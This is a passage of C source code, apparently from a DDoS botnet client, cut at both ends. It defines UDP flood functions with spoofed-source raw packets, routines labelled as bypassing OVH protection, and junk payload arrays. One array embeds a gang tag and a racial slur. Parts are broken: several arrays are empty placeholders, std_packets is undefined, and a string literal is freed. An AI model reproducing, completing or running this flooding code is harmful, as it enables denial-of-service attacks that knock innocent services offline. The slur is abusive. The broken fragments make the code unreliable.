    if (newpids == NULL) return -1; // check malloc failure

    for (uint32_t i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;

    return parent; // return parent process with child PID
}
/**
 * calculates the checksum for a given buffer
 *
 * @param buf pointer to the buffer
 * @param count size of the buffer in bytes
 * @return calculated checksum
 */
unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) {
        sum += *buf++; // add buffer value to sum
        count -= 2; // decrement count by the size of short
    }
    if (count > 0) {
        sum += *(unsigned char *)buf; // handle odd byte
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16); // fold high into low
    }
    return (uint16_t)(~sum); // one's complement
}
/**
 * calculates the tcp checksum for given ip and tcp headers
 *
 * @param iph pointer to the ip header
 * @param tcph pointer to the tcp header
 * @return calculated tcp checksum
 */
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    if (tcp == NULL) return 0; // check for malloc failure

    // construct pseudo header and tcp header for checksum calculation
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));

    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}
/**
 * constructs an ip packet header
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5; // internet header length
    iph->version = 4; // ipv4
    iph->tos = 0; // type of service
    iph->tot_len = sizeof(struct iphdr) + packetSize; // total length
    iph->id = rand_cmwc(); // random id
    iph->frag_off = 0; // fragment offset
    iph->ttl = MAXTTL; // time to live
    iph->protocol = protocol; // set protocol
    iph->check = 0; // checksum set to 0 before calculation
    iph->saddr = source; // source address
    iph->daddr = dest; // destination address
}
/**
 * sends packets to a specified target
 *
 * @param target destination IP address as a string
 * @param port destination port, random if 0
 * @param timeEnd duration to send packets
 * @param spoofit spoofing level for IP addresses
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck checks when to sleep
 * @param sleeptime time to sleep in milliseconds
 */
void k2o_BB2(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    if (spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (!sockfd) return;

        unsigned char *buf = malloc(packetsize + 1);
        if (buf == NULL) return;
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;

        for (unsigned int i = 0, ii = 0; ; ) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if (i++ == pollinterval) {
                dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
                if (time(NULL) > end) break;
                i = 0;
            }
            if (ii++ == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
            }
        }
        free(buf);
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd) return;

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) return;
        srand_cmwc();

        in_addr_t netmask = spoofit == 0 ? ~((in_addr_t)-1) : ~((1 << (32 - spoofit)) - 1);
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        int end = time(NULL) + timeEnd;
        for (unsigned int i = 0, ii = 0; ; ) {
            makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(findRandIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
            udph->len = htons(sizeof(struct udphdr) + packetsize);
            udph->source = rand_cmwc();
            udph->dest = port == 0 ? rand_cmwc() : htons(port);
            udph->check = 0;
            makeRandomStr((unsigned char *)(udph + 1), packetsize);
            iph->check = csum((unsigned short *)packet, iph->tot_len);

            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if (i++ == pollinterval) {
                if (time(NULL) > end) break;
                i = 0;
            }
            if (ii++ == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
            }
        }
    }
}
/**
 * sends UDP packets to a specified IP for a given duration
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendSTD(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;

    hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    // array of predefined strings to be used in the packets
    char *randstrings[] = {
        // include the array of strings provided
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "RyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGang",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "yfj82z4ou6nd3pig3borbrrqhcve6n56xyjzq68o7yd1axh4r0gtpgyy9fj36nc2w",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        "01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdedsecrunsyoulilassniggaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    };

    unsigned int a = 0;
    while (1) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))]; // select a random string
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));

            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0); // exit after the specified time
            }
            a = 0;
        }
        a++;
    }
}
/**
 * sends specific packets for bypassing OVH protection
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendOvhBypassOne(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = { /* Include the array of strings here */ };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendOvhBypassTwo(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23",
        "\x78\x6d\x69\x77\x64\x69\x6f\x20\x4d\x4f\x51\x57\x49\x22\x4b\x20\x28\x2a\x2a\x28\x44\x38\x75\x39\x32\x38\x39\x64\x32\x38\x39\x32\x65\x39\x20\x4e\x49\x4f\x57\x4a\x44\x69\x6f\x6a\x77\x69\x6f\x57\x41\x4a\x4d\x20\x44\x4b\x4c\x41\x4d\x29\x20",
        "/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57",
        };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendOvhBypassThree(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {"/73x/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x49/x4f/x57/x20/x57/x4f/x4b/x3c/x20/x57/x44/x4b/x20/x44/x29/x5f/x41/",
        "/20x/x58/x4b/x49/x57/x44/x49/x4a/x22/x20/x22/x64/x39/x63/x39/x29/x4d/x20/x29/x57/x5f/x22/x21/x5f/x2b/x20/x51/x53/x4d/x45/x4d/x44/x4d/x20/x29/x28/x28/x22/x29/x45/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/",
        "/43x/x4f/x44/x57/x20/x49/x20/x22/x5f/x29/x20/x58/x43/x4b/x4d/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/x51/x20/x71/x5b/x7a/x71/x3b/x38/x38/x20/x43/x57/x29/x57/x22/x29/x64/x32/x20/x4b/x58/x4b/x4b/x4c/x22/x44/x20/x2d/x44/x5f/",
        };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
/**
 * sends specific UDP packets to a target IP for a duration
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendZgo(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {/* array of strings here */};

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendZDP(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {/* array of strings here */};

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
/**
